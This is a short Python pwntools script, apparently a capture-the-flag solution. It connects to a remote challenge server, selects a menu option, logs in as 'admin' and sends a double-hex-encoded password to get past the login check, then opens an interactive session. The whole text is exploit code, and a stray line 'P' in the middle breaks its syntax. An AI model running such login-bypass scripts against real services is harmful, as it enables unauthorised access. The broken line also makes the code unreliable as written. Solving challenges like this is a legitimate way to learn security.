
from pwn import *

original_hex_str_as_bytes = b'61646d696e'

payload = original_hex_str_as_bytes.hex()


io = remote('challenge.secso.cc', 7002)

io.sendlineafter(b'(1, 2, 3)> ', b'2')


io.sendlineafter(b'Login: ', b'admin')
P

log.info(f"Sending payload: {payload}")
io.sendlineafter(b'Password: ', payload.encode())


io.interactive()